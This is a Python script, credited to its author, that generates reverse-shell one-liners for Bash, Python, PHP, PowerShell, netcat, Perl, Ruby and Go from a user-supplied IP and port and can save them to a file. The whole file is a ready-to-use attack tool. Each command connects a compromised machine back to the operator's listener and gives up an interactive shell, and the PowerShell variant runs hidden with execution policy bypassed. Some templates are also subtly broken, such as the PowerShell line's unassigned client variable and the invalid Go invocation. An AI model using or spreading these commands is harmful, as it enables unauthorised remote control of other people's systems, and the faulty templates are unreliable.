def generate_reverse_shells(ip, port):
    shells = {
        "# BASH #": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1\n",
        "# PYTHON #": f"python -c 'import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"{ip}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\"/bin/bash\")'\n",
        "# PHP #": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'\n",
        "# POWERSHELL #": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$buffer = 0..65535|%{{0}};while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}'\n",
        "# NETCAT #": f"nc -e /bin/bash {ip} {port}\n",
        "# PERL #": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'\n",
        "# RUBY #": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\n",
        "# GO #": f"go run -e 'package main;import\"net\";import\"os\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'\n",
    }
    return shells


if __name__ == "__main__":
    print(" # Reverse Shell One-Liner Generator # \n#######################################\n\t  # Made by Mick19j #  \n########################################\n")
    ip = input("Enter your IP address: ").strip()
    port = input("Enter your listening port: ").strip()

    try:
        port = int(port)
    except ValueError:
        print("Invalid port number. Please enter a valid number.")
        exit(1)

    shells = generate_reverse_shells(ip, port)
    print("\nGenerated Reverse Shell Commands:\n")
    for lang, shell in shells.items():
        print(f"{lang}:\n{shell}\n")

    save_to_file = input("Do you want to save the commands to a file? (y/n): ").lower()
    if save_to_file == "y":
        with open("reverse_shells.txt", "w") as file:
            for lang, shell in shells.items():
                file.write(f"{lang}:\n{shell}\n\n")
        print("Commands are saved to reverse_shells.txt!")
